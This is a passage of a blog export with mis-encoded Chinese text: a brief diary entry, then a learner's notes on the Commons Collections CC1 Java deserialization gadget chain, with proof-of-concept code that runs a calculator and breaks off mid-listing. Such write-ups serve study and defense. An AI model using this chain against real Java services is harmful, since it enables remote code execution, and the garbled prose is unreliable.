    <content><![CDATA[<p>å¥½ä¹…æ²¡æ›´æ–°åšå®¢äº†ï¼Œä¸€æ–¹é¢æ˜¯å› ä¸ºåœ¨å®¶çš„æ—¶å€™æ”¾å‡å¤ªå®‰é€¸æœ‰ç‚¹æ‡’äº†ï¼Œä¸€æ–¹é¢æ˜¯å› ä¸ºç°åœ¨æ¥åŒ—äº¬äº†ï¼Œæœ€è¿‘åœ¨åšé¡¹ç›®ï¼ˆç‰›é©¬ï¼‰ï¼Œè¿™ä¹ˆæ™šè¿˜ä¸ç¡æ˜¯å› ä¸ºåœ¨è°ƒä½œæ¯ï¼Œå¸Œæœ›æ˜å¤©æ™šä¸Šå¤œç­ä¸è¦çŒç¡ã€‚</p>
<p>ç„¶åä¸€ä¸ªäººæ‰‹æœºä¹Ÿåˆ·ç´¯äº†å°±ä¸çŸ¥é“è¦å¹²å•¥ï¼Œå­¦ä¹ ä¹Ÿå­¦ä¸å¤ªä¸‹ï¼Œæœ€è¿‘ç”Ÿæ´»è¢«å·¥ä½œæŒ¤å äº†ï¼Œæœ‰ç‚¹åœæ­¢äº†æ€è€ƒï¼ˆè™½ç„¶æœ‰ç©ºæ€è€ƒçš„æ—¶å€™ä¹Ÿæ²¡æ€è€ƒå‡ºä»€ä¹ˆï¼Œä¾æ—§å¯¹æœªæ¥å……æ»¡è¿·èŒ«ğŸ˜•</p>
<p>æ‰“å¼€ç”µè„‘çœ‹çœ‹è¿™çœ‹çœ‹é‚£ï¼Œå°±æƒ³ç€å†™ç¯‡åšå®¢è®°å½•ä¸‹è¿™ä¸€æ™šä¸Šå§</p>
<p>é™„ï¼šä»Šæ™šä¸€ä¸ªäººçˆ½åƒéº¦å½“åŠ³è–¯æ¡ï¼ˆåæ§½ä¸€ä¸‹æœ¬æŒ‘é£Ÿäººç›®å‰åœ¨åŒ—äº¬æ²¡åƒåˆ°ä»€ä¹ˆç‰¹åˆ«å¥½åƒçš„ä¸œè¥¿</p>
<img     src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240730035355.png"   style="zoom:50%;" >

<p>åƒå®Œéª‘è½¦å…œé£éšæ‰‹æ‹</p>
<img     src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240730035326.png"   style="zoom:50%;" >

<p>å†™äº7.28å‡Œæ™¨</p>
]]></content>
      <tags>
        <tag>æ‚</tag>
        <tag>ç”Ÿæ´»è®°å½•</tag>
      </tags>
  </entry>
  <entry>
    <title>cc1å­¦ä¹ ç¬”è®°</title>
    <url>/2024/11/29/cc1%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<h4 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h4><p>æœ¬ç¯‡æ–‡ç« å•çº¯è®°å½•è‡ªå·±å­¦ä¹ cc1çš„è¿‡ç¨‹ï¼Œé‡Œé¢é‡åˆ°ä¸€äº›ç‚¹æœ‰äº›éš¾ç†è§£ï¼Œæˆ‘æ€»æ˜¯è¯•å›¾è®°å½•ä¸‹æ¥å¸®åŠ©è‡ªå·±ç†è§£ï¼ˆè™½ç„¶æœ‰äº›æ—¶å€™çº ç»“çš„ç‚¹å¾ˆè ¢:)ï¼Œæ‰€ä»¥æ•´ç†å‡ºæ¥ç®—æ˜¯ç›‘ç£è‡ªå·±å­¦ä¹ å§ã€‚è‡ªå·±javaåŸºç¡€ä¸æ˜¯å¾ˆæ‰å®ï¼Œå¯èƒ½æœ‰ç†è§£ä¸å¯¹çš„åœ°æ–¹ï¼Œéå¸¸æ¬¢è¿è”ç³»æˆ‘ï¼ˆwxï¼šLintian3188ï¼‰æŒ‡æ­£ï¼Œæ„Ÿè°¢ğŸ™</p>
<h4 id="åå°„è°ƒç”¨runtimeæ‰§è¡Œcalc"><a href="#åå°„è°ƒç”¨runtimeæ‰§è¡Œcalc" class="headerlink" title="åå°„è°ƒç”¨runtimeæ‰§è¡Œcalc"></a>åå°„è°ƒç”¨runtimeæ‰§è¡Œcalc</h4><p>æ­£å¸¸è°ƒç”¨runtimeæ‰§è¡Œcalcè¯­å¥åº”è¯¥æ˜¯</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Runtime.getRuntime().exec(&quot;open -a Calculator&quot;);</span><br></pre></td></tr></table></figure>

<p>åå°„æ˜¯</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>);</span><br><span class="line"><span class="type">Method</span> <span class="variable">getRuntime</span> <span class="operator">=</span> c.getMethod(<span class="string">&quot;getRuntime&quot;</span>);</span><br><span class="line"><span class="type">Method</span> <span class="variable">exec</span> <span class="operator">=</span> c.getMethod(<span class="string">&quot;exec&quot;</span>, String.class);</span><br><span class="line"><span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> getRuntime.invoke(<span class="literal">null</span>);</span><br><span class="line">exec.invoke(o, <span class="string">&quot;Open -a Calculator&quot;</span>);</span><br></pre></td></tr></table></figure>

<p>ç¬¬ä¸€å¥ä½¿ç”¨Class.forName åŠ¨æ€åŠ è½½Runtimeï¼Œæ­¤æ—¶çš„cæ˜¯Runtimeçš„classå¯¹è±¡</p>
<p>ç¬¬äºŒå¥ä½¿ç”¨getMethodè·å–åˆ°getRuntimeæ–¹æ³•ï¼Œè¿”å›çš„æ˜¯Methodå¯¹è±¡</p>
<p>ç¬¬ä¸‰å±€ç»§ç»­ä½¿ç”¨getMethodè·å–execæ–¹æ³•æœ‰ä¸€ä¸ªString.classæ˜¯å› ä¸ºexecæ­£å¸¸è°ƒç”¨çš„æ—¶å€™å°±éœ€è¦ä¸€ä¸ªå‚æ•°String</p>
<p>ç¬¬å››å¥ä½¿ç”¨inokeä¹Ÿå°±æ˜¯æ‰§è¡ŒgetRuntimeï¼Œçœ‹ä¸€ä¸‹æºç </p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="type">Runtime</span> <span class="variable">currentRuntime</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Runtime</span>();</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Runtime <span class="title function_">getRuntime</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> currentRuntime;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>å°±æ˜¯æ‰§è¡Œè¿™ä¸ªæ–¹æ³•åˆšå¥½ä¼šè¿”å›ä¸€ä¸ªcurrentRuntimeï¼Œè¿™ä¸ªå˜é‡æ˜¯Runtimeç±»å‹çš„å¯¹è±¡ï¼Œ<strong>æœ‰è¿™ä¸ªæ‰èƒ½è®©æˆ‘ä»¬execæ­£å¸¸è°ƒç”¨</strong></p>
<p>å¯ä»¥ç†è§£æˆ<code>Object o = getRuntime.invoke(null);</code>æ‰§è¡Œæ•ˆæœç­‰äº<code>Runtime.getRuntime()</code></p>
<p>ç¬¬äº”å¥invoke çš„ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯ç›®æ ‡å®ä¾‹å¯¹è±¡ oï¼Œç¬¬äºŒä¸ªå‚æ•°æ˜¯æ–¹æ³•çš„å®é™…å‚æ•°ï¼Œæ‰€ä»¥å°±ç›¸å½“äºæ‰§è¡Œäº†Runtime.getRuntime().exec</p>
<h4 id="ä¸ºä»€ä¹ˆcc1é“¾å­ç»ˆç‚¹æ˜¯InvokerTransformer-transform"><a href="#ä¸ºä»€ä¹ˆcc1é“¾å­ç»ˆç‚¹æ˜¯InvokerTransformer-transform" class="headerlink" title="ä¸ºä»€ä¹ˆcc1é“¾å­ç»ˆç‚¹æ˜¯InvokerTransformer.transform()"></a>ä¸ºä»€ä¹ˆcc1é“¾å­ç»ˆç‚¹æ˜¯InvokerTransformer.transform()</h4><p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/image-20241127222026796.png" ></p>
<p>ç›´æ¥è·Ÿè¿›åˆ°è¿™ä¸ªç±»ï¼Œé‡Œé¢çš„<code>transform</code>æ–¹æ³•ç”¨åˆ°äº†åå°„ï¼Œæˆ‘ä»¬æœ€åå°±æ˜¯è¦åˆ©ç”¨è¿™ä¸ªå¾ˆçµæ´»çš„æœºåˆ¶å®ç°æ¶æ„ä»£ç æ‰§è¡Œ</p>
<p>æˆ‘ä»¬ä¸€å¼€å§‹ç›´æ¥è°ƒç”¨æŸ¥çœ‹</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">Runtime</span> <span class="variable">runtime</span> <span class="operator">=</span> Runtime.getRuntime();</span><br><span class="line">        <span class="type">InvokerTransformer</span> <span class="variable">invokerTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;open -a calculator&quot;</span>&#125;); <span class="comment">// è¿™ä¸ªInvokerTransformeræ„é€ çš„è¦æ±‚</span></span><br><span class="line">        invokerTransformer.transform(runtime);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>InvokerTransformer.transform()</code>æ–¹æ³•é‡Œé¢ï¼Œ<code>iMethodName</code>å¯¹åº”æˆ‘ä»¬å‰é¢æ„é€ çš„<code>exec</code>ï¼Œ<code>iParamTypes</code>å¯¹åº”<code>String.class</code>ï¼Œ<code>iArgs</code>å¯¹åº”æˆ‘ä»¬è¦æ‰§è¡Œçš„å‘½ä»¤ï¼Œåœ¨<code>public InvokerTransformer(String methodName, Class[] paramTypes, Object[] args)</code>æ¥çœ‹ï¼Œè¿™å†™éƒ½å®Œç¾å¯¹åº”æˆ‘ä»¬è¿™æ¬¡åå°„è°ƒç”¨Runtimeæ‰§è¡Œå‘½ä»¤çš„é€»è¾‘</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Class</span> <span class="variable">cls</span> <span class="operator">=</span> input.getClass();</span><br><span class="line"><span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> cls.getMethod(iMethodName, iParamTypes);</span><br><span class="line"><span class="keyword">return</span> method.invoke(input, iArgs);</span><br></pre></td></tr></table></figure>

<h4 id="åˆæ­¥çš„é“¾å­"><a href="#åˆæ­¥çš„é“¾å­" class="headerlink" title="åˆæ­¥çš„é“¾å­"></a>åˆæ­¥çš„é“¾å­</h4><p>å°±æ˜¯ç‚¹å‡»è¿™ä¸ªå‡½æ•°å³é”®æŸ¥æ‰¾ç”¨æ³•ï¼Œæœ‰å¾ˆå¤šè°ƒç”¨çš„åœ°æ–¹ï¼Œæˆ‘ä»¬éœ€è¦ç­›å‡ºæ¯”è¾ƒåˆé€‚çš„</p>
<p>é“¾å­çš„æ­£ç¡®é¡ºåºå°±æ˜¯æ‰¾åˆ°<code>TransformedMap</code>çš„<code>checkSetValue()</code></p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/image-20241127231528425.png" ></p>
<p>é‡Œé¢è°ƒç”¨äº†valueTransformer.transform(value);ï¼Œè·Ÿè¿›çœ‹ä¸€ä¸‹<code>valueTransformer</code>æ˜¯ä»€ä¹ˆ</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/image-20241127231711828.png" ></p>
<p>èƒ½åœ¨TransformedMapçš„ä¸€ä¸ªæ„é€ æ–¹æ³•é‡Œé¢å‘ç°å®ƒè¢«è°ƒç”¨ï¼Œç„¶åä»–çš„ä½œç”¨åŸŸæ˜¯<strong>proteced</strong>ï¼Œè¿˜è¦åœ¨TransformedMapé‡Œæ‰¾åˆ°è°å»è°ƒç”¨äº†è¿™ä¸ªæ–¹æ³•ï¼Œå®šä½åˆ°äº†<code>decorate()</code>ï¼Œè¿™ä¸ªæ˜¯publicæ–¹æ³•</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/image-20241127232849716.png" >å…¶å®ä¼ å…¥çš„å‚æ•°åŠæˆ·æ²¡æœ‰å·®åˆ«ï¼Œæ„Ÿè§‰å°±æ˜¯å¤šäº†ä¸€å±‚ï¼Œå°±ç†è§£ä¸ºè‡ªæˆ‘è£…é¥°å§</p>
<p>å…ˆæŠŠé“¾å­æ•´ç†ä¸€ä¸‹ï¼Œç›®å‰çš„æƒ…å†µä¸»è¦å°±æ˜¯è¿½è¸ªåˆ°äº†checkSetValue()ï¼Œç„¶åæˆ‘ä»¬è¦æ§åˆ¶é‡Œé¢çš„<code>valueTransformer</code>æ˜¯æˆ‘ä»¬å‰é¢è‡ªå·±å·²ç»å†™å¥½çš„çš„<code>invokerTransformer</code>ï¼Œæ‰èƒ½é¡ºåˆ©è°ƒç”¨ï¼Œè¿™é‡Œå†å°è¯•å†™å‡ºä»£ç ï¼š</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> NoSuchMethodException, InvocationTargetException, IllegalAccessException &#123;</span><br><span class="line">        <span class="type">Runtime</span> <span class="variable">runtime</span> <span class="operator">=</span> Runtime.getRuntime();</span><br><span class="line">        <span class="type">InvokerTransformer</span> <span class="variable">invokerTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;open -a calculator&quot;</span>&#125;);</span><br><span class="line"><span class="comment">//        invokerTransformer.transform(runtime);</span></span><br><span class="line">        HashMap&lt;Object,Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">decorateMap</span> <span class="operator">=</span> TransformedMap.decorate(hashMap,<span class="literal">null</span>,invokerTransformer);</span><br><span class="line">        Class&lt;TransformedMap&gt; transformedMapClass = TransformedMap.class;</span><br><span class="line">        <span class="type">Method</span> <span class="variable">checkSetValues</span> <span class="operator">=</span> transformedMapClass.getDeclaredMethod(<span class="string">&quot;checkSetValue&quot;</span>,Object.class);</span><br><span class="line">        checkSetValues.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        checkSetValues.invoke(decorateMap,runtime);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>è®²ä¸€ä¸‹ï¼Œè¿™é‡ŒinvokerTransformerå°±æ˜¯ç”¨äºæœ€åinvokerTransformer.transform()çš„æ‰§è¡Œï¼Œä¸ºä»€ä¹ˆè¿™ä¹ˆå®šä¹‰å‰é¢å·²ç»å†™äº†ï¼Œç„¶åæ–°å»ºä¸€ä¸ªHashMapå˜é‡æ˜¯ç”¨äº TransformedMap.decorate()çš„è°ƒç”¨ï¼Œè¿™ä¸ªå‡½æ•°å°±æ˜¯å¯¹ä¸€ä¸ªmapè¿›è¡Œè£…é¥°ï¼Œè¿›å…¥è¿™ä¸ªå‡½æ•°æ‰ä¼šè§¦å‘TransformedMapçš„æ„é€ å‡½æ•°ï¼Œæ‰èƒ½ç»™valueTransformerèµ‹å€¼ï¼Œè¿™å°±ç®—æ˜¯å‡†å¤‡å·¥ä½œï¼Œåé¢æˆ‘ä»¬éœ€è¦å‡ºå‘checkSetValueå‡½æ•°ï¼Œè¿™ä¸ªæ‰æ˜¯é‡å¤´æˆï¼Œå› ä¸ºæ˜¯protectedçš„ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦åå°„è°ƒç”¨ï¼Œåé¢å‡ å¥å…¨æ˜¯ä¸ºäº†è§¦å‘åå°„åšçš„å‡†å¤‡å·¥ä½œ</p>
<h4 id="è¿›ä¸€æ­¥çš„é“¾å­"><a href="#è¿›ä¸€æ­¥çš„é“¾å­" class="headerlink" title="è¿›ä¸€æ­¥çš„é“¾å­"></a>è¿›ä¸€æ­¥çš„é“¾å­</h4><p>ç›®å‰æˆ‘ä»¬å°±å¡åœ¨checkSetValueè¿™é‡Œï¼Œè¿˜è¦æ»¡è¶³decorateï¼Œæˆ‘ä»¬å†find usageçœ‹è°è°ƒç”¨äº†checkSetValue</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/image-20241128215139772.png" ></p>
<p>æ¥åˆ°<code>AbstractInputCheckedMapDecorator</code>è¿™ä¸ªæŠ½è±¡ç±»ï¼Œå®ƒè¿˜æ˜¯TransformerdMapçš„çˆ¶ç±»ï¼Œé‡Œé¢ä¸€ä¸ªç»§æ‰¿äº†<code>AbstractSetDecorator</code>çš„å†…éƒ¨ç±»MapEntryæœ‰<code>setValue</code>æ–¹æ³•è°ƒç”¨äº†æˆ‘ä»¬è¦çš„checkSetValueæ–¹æ³•</p>
<blockquote>
<p><code>setValue()</code> <strong>å®é™…ä¸Šå°±æ˜¯åœ¨ Map ä¸­å¯¹ä¸€ç»„ entryï¼ˆé”®å€¼å¯¹ï¼‰</strong>è¿›è¡Œ <code>setValue()</code> æ“ä½œã€‚</p>
<p>ä¸€ä¸ªMapEntryå°±æ˜¯hashçš„ä¸€ä¸ªé”®å€¼å¯¹</p>
</blockquote>
<p>æ‰€ä»¥å°±æ˜¯è¯´å½“æˆ‘ä»¬åœ¨è°ƒç”¨decorateå¯¹mapè¿›è¡Œ<strong>éå†</strong>çš„æ—¶å€™ï¼Œå°±ä¼šè§¦å‘setValueï¼Œè€Œè¿™ä¸ªé‡å†™çš„setValueä¼šè§¦å‘æˆ‘ä»¬è¦çš„checkSetValue</p>
<p>å†é‡å†™ç°åœ¨çš„POC</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> NoSuchMethodException, InvocationTargetException, IllegalAccessException &#123;</span><br><span class="line">        <span class="type">Runtime</span> <span class="variable">runtime</span> <span class="operator">=</span> Runtime.getRuntime();</span><br><span class="line">        <span class="type">InvokerTransformer</span> <span class="variable">invokerTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;open -a calculator&quot;</span>&#125;);</span><br><span class="line"><span class="comment">//        invokerTransformer.transform(runtime);</span></span><br><span class="line">        HashMap&lt;Object,Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        hashMap.put(<span class="string">&quot;a&quot;</span>,<span class="string">&quot;b&quot;</span>); <span class="comment">// ç»™hashèµ‹å€¼ï¼Œä¿è¯åé¢ä¼šç»å…¥éå†çš„é‚£ä¸ªforå¾ªç¯</span></span><br><span class="line">        Map&lt;Object,Object&gt; decorateMap = TransformedMap.decorate(hashMap,<span class="literal">null</span>,invokerTransformer); <span class="comment">// æåˆ°decorate</span></span><br><span class="line">        <span class="keyword">for</span> (Map.Entry entry:decorateMap.entrySet())&#123;</span><br><span class="line">            entry.setValue(runtime);</span><br><span class="line">        &#125; <span class="comment">// ä¸»åŠ¨éå†è§¦å‘è¿™ä¸ªé‡å†™çš„setValue</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ç›´æ¥è°ƒç”¨decorateï¼Œè¿”å›ä¸€ä¸ªTransformedMapçš„ä¸œè¥¿ï¼Œåé¢éå†çš„æ—¶å€™æ‰ä¼šè¿›åˆ°æˆ‘ä»¬è¦åˆ°çš„setValue</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Map&lt;Object,Object&gt; decorateMap = TransformedMap.decorate(hashMap,null,invokerTransformer);</span><br></pre></td></tr></table></figure>

<p>æ‰€ä»¥ç°åœ¨çš„é“¾å­å°±æ˜¯æ‰¾åˆ°ä¸€ä¸ªå…¥å£hashmapï¼Œå»è§¦å‘è·å–TransformedMapå†å»éå†å®ƒè§¦å‘setValueå‡½æ•°ï¼Œ</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hashMapå…¥å£</span><br><span class="line">	-&gt; .decorate() -&gt; TransformedMap</span><br><span class="line">		-&gt; éå†setValue()</span><br><span class="line">			-&gt;AbstractInputCheckedMapDecorator#setValue()</span><br><span class="line">				-&gt; TransformedMap#checkSetValue()</span><br><span class="line">					-&gt; InvokerTransformer#transform()</span><br></pre></td></tr></table></figure>

<h4 id="æ‰¾åˆ°é“¾é¦–readObject"><a href="#æ‰¾åˆ°é“¾é¦–readObject" class="headerlink" title="æ‰¾åˆ°é“¾é¦–readObject"></a>æ‰¾åˆ°é“¾é¦–readObject</h4><p>æˆ‘ä»¬åœ¨find usageï¼Œæ‰¾åˆ°æœ‰ä¸€ä¸ªç±»é‡Œé¢çš„readObjectå°±è°ƒç”¨äº†setValueï¼ˆè¿™é‡Œè¿˜æ˜¯æœ‰ä¸€äº›é™åˆ¶æ¡ä»¶çš„ï¼Œåé¢å†è§£å†³ï¼‰</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/image-20241128222954112.png" ></p>
<p>æ‰€ä»¥æŒ‰ç†è¯´æˆ‘ä»¬åºåˆ—åŒ–<code>AnnotationInvocationHandler</code>è¿™ä¸ªç±»çš„æ—¶å€™å°±ä¼šè§¦å‘<code>readObject</code>ç´§æ¥ç€åé¢çš„é“¾å­</p>
<p>ç„¶åè¿™ä¸ªç±»æ²¡æœ‰å†™æ˜ä½œç”¨åŸŸï¼Œå°±ç®—æ˜¯defaultï¼Œè¿˜æ˜¯è¦ç”¨åå°„è°ƒç”¨ï¼Œç†æƒ³çŠ¶æ€ä¸‹çš„poc</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">Runtime</span> <span class="variable">runtime</span> <span class="operator">=</span> Runtime.getRuntime();</span><br><span class="line">        <span class="type">InvokerTransformer</span> <span class="variable">invokerTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span></span><br><span class="line">                , <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;open -a calculator&quot;</span>&#125;);</span><br><span class="line">        HashMap&lt;Object, Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        hashMap.put(<span class="string">&quot;key&quot;</span>, <span class="string">&quot;value&quot;</span>);</span><br><span class="line">        Map&lt;Object, Object&gt; transformedMap = TransformedMap.decorate(hashMap, <span class="literal">null</span>, invokerTransformer);</span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>); <span class="comment">// è·å–ç±»</span></span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">aihConstructor</span> <span class="operator">=</span> c.getDeclaredConstructor(Class.class, Map.class); <span class="comment">// è·å–æ„é€ å™¨</span></span><br><span class="line">        aihConstructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> aihConstructor.newInstance(Override.class, transformedMap); <span class="comment">// å®ä¾‹åŒ–</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// åºåˆ—åŒ–ååºåˆ—åŒ–</span></span><br><span class="line">        serialize(o); <span class="comment">// äºæ˜¯è‡ªåŠ¨è§¦å‘readObject</span></span><br><span class="line">        unserialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">		&#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(String Filename)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException&#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(Filename));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> ois.readObject();</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>



<h4 id="ç°åœ¨çš„å‡ ä¸ªé—®é¢˜"><a href="#ç°åœ¨çš„å‡ ä¸ªé—®é¢˜" class="headerlink" title="ç°åœ¨çš„å‡ ä¸ªé—®é¢˜"></a>ç°åœ¨çš„å‡ ä¸ªé—®é¢˜</h4><p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/image-20241129104607762.png" ></p>
<ul>
<li>æœ‰å‡ ä¸ªifåˆ¤æ–­éœ€è¦è§£å†³</li>
<li>readObjecté‡Œé¢çš„setValueå‡½æ•°ä¼ å‚è¦æ€ä¹ˆæ§åˆ¶ï¼Œæˆ‘ä»¬è¦ä¼ çš„æ˜¯Runtimeå¯¹è±¡ï¼Œä»£ç é‡Œæ˜æ˜¾å’Œæˆ‘ä»¬è¦åšçš„ä¸ä¸€æ ·</li>
<li>Runtime.classä¸èƒ½åºåˆ—åŒ–</li>
</ul>
<h5 id="è§£å†³Runtimeä¸èƒ½åºåˆ—åŒ–"><a href="#è§£å†³Runtimeä¸èƒ½åºåˆ—åŒ–" class="headerlink" title="è§£å†³Runtimeä¸èƒ½åºåˆ—åŒ–"></a>è§£å†³Runtimeä¸èƒ½åºåˆ—åŒ–</h5><p>Runtimeä¸èƒ½åºåˆ—åŒ–ï¼Œä½†æ˜¯Runtime.classå¯ä»¥ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥å†™ä¸€ä¸ªæ™®é€šåå°„ï¼Œç„¶åè®¾æ³•è®©InvokerTransformerè°ƒç”¨</p>
<p>æ­£å¸¸é‡Œè¯´ï¼Œæˆ‘ä»¬çš„åå°„è°ƒç”¨runtime.classæ˜¯è¿™ä¹ˆå†™</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> Runtime.class;</span><br><span class="line">        <span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> c.getMethod(<span class="string">&quot;getRuntime&quot;</span>);</span><br><span class="line">        <span class="type">Runtime</span> <span class="variable">runtime</span> <span class="operator">=</span> (Runtime) method.invoke(<span class="literal">null</span>);</span><br><span class="line">        <span class="type">Method</span> <span class="variable">exec</span> <span class="operator">=</span> c.getMethod(<span class="string">&quot;exec&quot;</span>,String.class);</span><br><span class="line">        exec.invoke(runtime,<span class="string">&quot;open -a calculator&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>è¿™å°±æ¯”è¾ƒéº»çƒ¦äº†ï¼Œæˆ‘ä»¬ç”¨InvokerTransformer.transform()ä¸€æ¬¡ä¸€æ¬¡å®ç°æˆ‘ä»¬è¦çš„æ•ˆæœ</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">Method</span> <span class="variable">getRuntime</span> <span class="operator">=</span> (Method) <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>&#125;).transform(Runtime.class);</span><br><span class="line">        <span class="comment">// getRuntime = c.class.getMethod(&quot;getRuntime&quot;);</span></span><br><span class="line">        <span class="type">Runtime</span> <span class="variable">runtime</span> <span class="operator">=</span> (Runtime) <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="literal">null</span>&#125;).transform(getRuntime);</span><br><span class="line">        <span 